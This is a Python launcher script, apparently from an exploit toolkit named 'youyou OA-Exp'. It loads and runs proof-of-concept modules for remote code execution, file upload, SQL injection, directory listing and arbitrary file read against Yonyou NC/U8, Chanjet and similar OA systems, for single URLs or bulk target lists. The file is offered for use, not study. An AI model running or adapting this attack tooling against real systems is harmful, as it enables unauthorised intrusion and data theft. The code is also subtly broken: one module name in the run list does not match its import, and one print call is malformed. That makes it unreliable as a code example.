import time
import argparse
import multiprocessing
from pyfiglet import Figlet
from rich.console import Console
from poc import nc_beanshell_rce,nc_upload_rce,nc_erp_sql,nc_u8_test_sql,nc_erp_directory
from poc import 用友畅捷通T_updata_任意文件上传,nc_U8_getSessionList,fe_oa_directiry, nc_readfile_everything

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    list = ['nc_beanshell_rce','nc_upload_rce','nc_u8_test_sql','nc_erp_sql','nc_erp_directory',
            '用友畅捷通20220910任意文件上传','nc_U8_getSessionList','fe_oa_directiry','nc_readfile_everything']
    for i in list:
        eval(i + ".main(target_url)")
        time.sleep(0.2)

    
if __name__ == '__main__':
    console.print(Figlet(font='slant').renderText('youyou OA-Exp'), style='bold blue')
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                console.print(now_time() + " [INFO]     正在检测:{}".format(url)+'\n', style='bold yellow')
                pool.apply(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            console.print(now_time() + " [INFO]     正在检测:{}".format(args.url)+'\n', style='bold yellow')
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')
